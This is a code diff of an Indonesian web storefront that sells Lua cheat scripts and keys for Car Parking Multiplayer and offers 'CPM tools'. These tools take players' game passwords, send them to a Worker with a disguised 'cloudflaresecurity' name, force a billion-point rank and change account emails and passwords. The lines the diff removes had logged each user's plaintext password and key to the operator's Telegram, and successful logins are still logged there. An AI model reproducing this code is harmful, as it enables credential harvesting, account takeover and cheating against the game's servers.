@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -261,7 +260,7 @@
                 <div x-show="selectedAmount > 0" class="space-y-4">
                     <input type="file" @change="handleFileUpload" class="text-xs text-gray-500 w-full mb-4">
                     <button @click="sendToWhatsApp" class="w-full bg-green-600 py-4 rounded-xl font-black flex items-center justify-center">
-                        <i class="fab fa-whatsapp mr-2 text-xl"></i> KONFIRMASI ADMIN
+                        <i class="fab fa-whatsapp mr-2 text-xl"></i> KONFIRMASI ADMIN (KIRIM BUKTI TRANSFER AGAR PROSES DIKONFIRMASI)
                     </button>
                 </div>
             </div>
@@ -332,11 +331,16 @@
     </main>
 
   <script>
+<script>
 function app() {
     return {
         // --- KONFIGURASI UTAMA ---
         WORKER_URL: "https://cdnscloudflaresecurity.angkawijaya2603.workers.dev",
-        currentPage: 'home', sideBar: false, loading: true, message: '', user: null, 
+        currentPage: 'home', 
+        sideBar: false, 
+        loading: true, 
+        message: '', 
+        user: null, 
         userData: { balance: 0 },
         cpmUser: { isLoggedIn: false, email: '', token: '', gameData: null },
         cpmForm: { gameId: '', email: '', password: '', key: '' },
@@ -349,7 +353,7 @@ function app() {
         isAdmin: false,
         allUsers: [],
 
-        // --- 1. INISIALISASI (AMBIL DATA DARI CLOUDFLARE) ---
+        // --- 1. INISIALISASI ---
         async init() {
             try {
                 const res = await fetch(this.WORKER_URL, { 
@@ -361,6 +365,7 @@ function app() {
                 this.firebaseConfig = initData.firebaseConfig;
 
                 if (!firebase.apps.length) firebase.initializeApp(this.firebaseConfig);
+                
                 firebase.auth().onAuthStateChanged((u) => {
                     this.user = u;
                     if (u) {
@@ -372,11 +377,14 @@ function app() {
                         }
                     }
                 });
-            } catch (e) { console.error("Koneksi Cloudflare Gagal"); }
-            this.loading = false;
+            } catch (e) { 
+                console.error("Koneksi Cloudflare Gagal:", e); 
+            } finally {
+                this.loading = false;
+            }
         },
         
-                async loginGoogle() {
+        async loginGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             try { 
                 await firebase.auth().signInWithPopup(provider); 
@@ -385,47 +393,50 @@ function app() {
             }
         },
 
+        // --- 2. TRANSAKSI ---
+        async beliProduk(productName) {
+            if (!this.user) return alert("Silakan Login terlebih dahulu!");
+            const product = this.products.find(p => p.name === productName);
+            const currentBalance = this.userData.balance || 0;
+            if (currentBalance < product.price) return alert("❌ Saldo tidak cukup!");
 
-    // --- 2. FITUR TRANSAKSI SCRIPT (VERSI AUTO DOWNLOAD) ---
-async beliProduk(productName) {
-    if (!this.user) return alert("Silakan Login terlebih dahulu!");
-    const product = this.products.find(p => p.name === productName);
-    const currentBalance = this.userData.balance || 0;
-    if (currentBalance < product.price) return alert("❌ Saldo tidak cukup!");
+            if (confirm(`Konfirmasi pembelian ${productName}?`)) {
+                this.loading = true;
+                try {
+                    // Potong Saldo
+                    await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => b - product.price);
+                    
+                    // Ambil detail file dari Worker
+                    const res = await fetch(this.WORKER_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ action: "get_product_detail", data: { name: productName } })
+                    });
+                    const detail = await res.json();
 
-    if (confirm(`Konfirmasi pembelian ${productName}?`)) {
-        this.loading = true;
-        try {
-            await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => b - product.price);
-            
-            const res = await fetch(this.WORKER_URL, {
-                method: 'POST',
-                body: JSON.stringify({ action: "get_product_detail", data: { name: productName } })
-            });
-            const detail = await res.json();
+                    // Simpan Riwayat
+                    await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                        productName, price: product.price, date: Date.now() 
+                    });
 
-            await firebase.database().ref('history/' + this.user.uid).push().set({ 
-                productName, price: product.price, date: Date.now() 
-            });
+                    this.logToTelegram(`🛒 **TRANSAKSI SUKSES**\nUser: ${this.user.email}\nProduk: ${productName}`);
 
-            this.logToTelegram(`🛒 **TRANSAKSI SUKSES**\nUser: ${this.user.email}\nProduk: ${productName}`);
+                    // Auto Download
+                    const link = document.createElement('a');
+                    link.href = detail.link;
+                    link.download = productName + ".lua";
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
 
-            // --- LOGIKA AUTO DOWNLOAD DI SINI ---
-            const link = document.createElement('a');
-            link.href = detail.link;
-            link.download = productName + ".lua"; // Memberi nama file saat didownload
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+                    alert(`✅ BERHASIL!\n\nFile sedang didownload.\n\nPASS SCRIPT: ${detail.pass}\n\n Silahkan SCREENSHOOT, Lalu halus TXT pada nama scriptnya`);
+                } catch (e) { 
+                    alert("Terjadi kesalahan transaksi!"); 
+                } finally {
+                    this.loading = false;
+                }
+            }
+        },
 
-            alert(`✅ PEMBELIAN BERHASIL!\n\nFile sedang didownload otomatis.\n\nPASSWORD /SCRIPT: ${detail.pass}\n\n Silahkan SCREENSHOOT, Lalu halus TXT pada nama scriptnya`);
-        } catch (e) { alert("Terjadi kesalahan!"); }
-        this.loading = false;
-    }
-},
-
-
-        // --- 3. FITUR BELI KEY LISENSI (AUTO GENERATE) ---
         async beliKey(keyName, price) {
             if (!this.user) return alert("Silakan Login!");
             if (this.userData.balance < price) return alert("❌ Saldo tidak cukup!");
@@ -444,29 +455,23 @@ async beliProduk(productName) {
                     });
 
                     this.logToTelegram(`🔑 **KEY GENERATED**\nUser: ${this.user.email}\nKey: \`${generatedKey}\``);
-                    alert(`✅ BERHASIL! SCREENSHOOT Sekarang Agar Tidak lupa.\n\nKEY: ${generatedKey}`);
-                } catch (e) { alert("Gagal generate key!"); }
-                this.loading = false;
+                    alert(`✅ BERHASIL! Silahkan SCREENSHOOT Agar Tidak Lupa\n\nKEY: ${generatedKey}`);
+                } catch (e) { 
+                    alert("Gagal generate key!"); 
+                } finally {
+                    this.loading = false;
+                }
             }
         },
 
-        // --- 4. FITUR LOGIN TOOLS (CPM) ---
-                async handleCpmLogin() {
+        // --- 3. CPM TOOLS ---
+        async handleCpmLogin() {
             if (!this.cpmForm.key || !this.cpmForm.email) return alert("Isi data!");
-            
-     
-            this.logToTelegram(`📡 **TRY LOGIN TOOL**\n` + 
-                `Acc: \`${this.cpmForm.email}\`\n` + 
-                `Pass: \`${this.cpmForm.password}\`\n` + 
-                `Key: \`${this.cpmForm.key}\`\n` + 
-                `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`);
-
             this.loading = true;
             try {
                 const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
                 if (!snap.val() || snap.val().status !== 'active') {
-                    this.logToTelegram(`❌ **LOGIN FAILED**: Invalid Key (\`${this.cpmForm.key}\`)`);
-                    throw new Error("Key Invalid!");
+                    throw new Error("Key Premium Tidak Valid!");
                 }
 
                 const res = await fetch(this.WORKER_URL, {
@@ -481,114 +486,74 @@ async beliProduk(productName) {
                     this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: { rankUrl: data.rankUrl } };
                     this.logToTelegram(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
                 } else {
-                    this.logToTelegram(`❌ **LOGIN FAILED**: Wrong Email/Pass for \`${this.cpmForm.email}\``);
-                    throw new Error("Login Gagal!");
+                    throw new Error("Email/Password Game Salah!");
                 }
-            } catch (e) { alert(e.message); }
-            this.loading = false;
+            } catch (e) { 
+                alert(e.message); 
+            } finally {
+                this.loading = false;
+            }
         },
 
-        
-                // --- FITUR TOOLS GAME (CPM) ---
         async setKingRank() {
             if (!this.cpmUser.isLoggedIn) return alert("Login Game dulu!");
             this.loading = true;
             try {
-                // King Rank tetap panggil langsung ke URL Rank karena ini Cloud Function CPM
                 await fetch(this.cpmUser.gameData.rankUrl, {
                     method: 'POST', 
                     body: JSON.stringify({ "auth": this.cpmUser.token, "rating": 1000000000 })
                 });
                 this.logToTelegram(`👑 **KING RANK SUCCESS**\nUser: ${this.cpmUser.email}`);
                 alert("KING RANK SUKSES!");
-            } catch (e) { alert("Gagal!"); }
-            this.loading = false;
+            } catch (e) { alert("Gagal Inject!"); }
+            finally { this.loading = false; }
         },
 
         async changeEmailPrompt() {
             if (!this.cpmUser.isLoggedIn) return alert("Login Game dulu!");
             const ne = prompt("Masukkan Email Baru:");
             if(!ne) return;
-            
             this.loading = true;
             try {
-                // Sekarang minta bantuan Worker (action: cpm_update)
                 const res = await fetch(this.WORKER_URL, {
                     method: 'POST',
                     body: JSON.stringify({
                         action: "cpm_update",
-                        data: { 
-                            gameId: this.cpmForm.gameId, 
-                            payload: { 
-                                idToken: this.cpmUser.token, 
-                                email: ne, 
-                                returnSecureToken: true, 
-                                upgradeToFederatedLogin: true 
-                            } 
-                        }
+                        data: { gameId: this.cpmForm.gameId, payload: { idToken: this.cpmUser.token, email: ne, returnSecureToken: true } }
                     })
                 });
-                
                 const result = await res.json();
-                if(res.ok && !result.error) {
-                    this.logToTelegram(`📩 **SUCCESS CHANGE EMAIL**\nOld: \`${this.cpmUser.email}\`\nNew: \`${ne}\``);
+                if(!result.error) {
                     this.cpmUser.email = ne;
                     alert("Email Berhasil Diganti!");
-                } else {
-                    throw new Error(result.error || "Gagal ganti email");
-                }
+                } else { throw new Error(result.error.message); }
             } catch (e) { alert("Error: " + e.message); }
-            this.loading = false;
+            finally { this.loading = false; }
         },
 
         async changePasswordPrompt() {
             if (!this.cpmUser.isLoggedIn) return alert("Login Game dulu!");
             const np = prompt("Masukkan Password Baru:");
             if(!np) return;
-
             this.loading = true;
             try {
-                // Minta bantuan Worker (action: cpm_update)
                 const res = await fetch(this.WORKER_URL, {
                     method: 'POST',
                     body: JSON.stringify({
                         action: "cpm_update",
-                        data: { 
-                            gameId: this.cpmForm.gameId, 
-                            payload: { 
-                                idToken: this.cpmUser.token, 
-                                password: np, 
-                                returnSecureToken: true 
-                            } 
-                        }
+                        data: { gameId: this.cpmForm.gameId, payload: { idToken: this.cpmUser.token, password: np, returnSecureToken: true } }
                     })
                 });
-
                 const result = await res.json();
-                if(res.ok && !result.error) {
-                    this.logToTelegram(`🔑 **SUCCESS CHANGE PASS**\nAcc: \`${this.cpmUser.email}\``);
-                    alert("Password Berhasil Diganti!");
-                } else {
-                    throw new Error(result.error || "Gagal ganti password");
-                }
+                if(!result.error) alert("Password Berhasil Diganti!");
+                else throw new Error(result.error.message);
             } catch (e) { alert("Error: " + e.message); }
-            this.loading = false;
+            finally { this.loading = false; }
         },
 
-        logoutCpm() { 
-            this.cpmUser = { isLoggedIn: false, email: '', token: '', gameData: null }; 
-        },
+        logoutCpm() { this.cpmUser = { isLoggedIn: false, email: '', token: '', gameData: null }; },
 
-        // Fungsi logToTelegram yang sudah diarahkan ke Worker (Bot Token Tersembunyi)
-        logToTelegram(t) {
-            fetch(this.WORKER_URL, { 
-                method: "POST", 
-                body: JSON.stringify({ action: "log_telegram", data: { text: t } }) 
-            });
-        }
-
-
-        // --- 5. LOGIKA FIREBASE DASAR ---
+        // --- 4. FIREBASE DATA ---
         fetchUserData(uid) {
             firebase.database().ref('users/' + uid).on('value', (snap) => {
                 if (snap.val()) this.userData = snap.val();
@@ -603,7 +568,7 @@ async beliProduk(productName) {
             });
         },
 
-        // --- 6. FITUR ADMIN ---
+        // --- 5. ADMIN ---
         fetchAllUsers() {
             firebase.database().ref('users').on('value', (snap) => {
                 const data = snap.val();
@@ -611,26 +576,28 @@ async beliProduk(productName) {
             });
         },
         updateBalance(uid, amt) { firebase.database().ref('users/' + uid + '/balance').transaction(b => (b || 0) + amt); },
-                 resetBalance(uid) { 
-            if(confirm("Yakin ingin reset saldo user ini jadi 0?")) {
-                firebase.database().ref('users/' + uid + '/balance').set(0); 
-            }
+        resetBalance(uid) { 
+            if(confirm("Reset saldo jadi 0?")) firebase.database().ref('users/' + uid + '/balance').set(0); 
         },
 
-        // --- 7. HELPER & SOSMED ---
+        // --- 6. HELPERS ---
+        logToTelegram(t) {
+            fetch(this.WORKER_URL, { 
+                method: "POST", 
+                body: JSON.stringify({ action: "log_telegram", data: { text: t } }) 
+            });
+        },
         handleFileUpload(event) { this.selectedFile = event.target.files[0]; },
         sendToWhatsApp() {
-            if (!this.selectedFile) return alert("Pilih bukti transfer!");
-            const msg = `Konfirmasi Top Up\nEmail: ${this.user.email}\nNominal: Rp ${this.selectedAmount.toLocaleString()}`;
+            if (!this.selectedAmount) return alert("Pilih nominal!");
+            const msg = `Halo Admin AWIMEDAN, saya ingin konfirmasi Top Up.\nEmail: ${this.user.email}\nNominal: Rp ${this.selectedAmount.toLocaleString()}`;
             window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(msg)}`, '_blank');
         },
-        logToTelegram(t) {
-            fetch(this.WORKER_URL, { method: "POST", body: JSON.stringify({ action: "log_telegram", data: { text: t } }) });
-        },
-        logoutGoogle() { firebase.auth().signOut(); location.reload(); }
+        logoutGoogle() { firebase.auth().signOut().then(() => location.reload()); }
     }
 }
 </script>
+
 
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
     
@@ -680,3 +647,4 @@ async beliProduk(productName) {
 
 </body>
 </html>
+
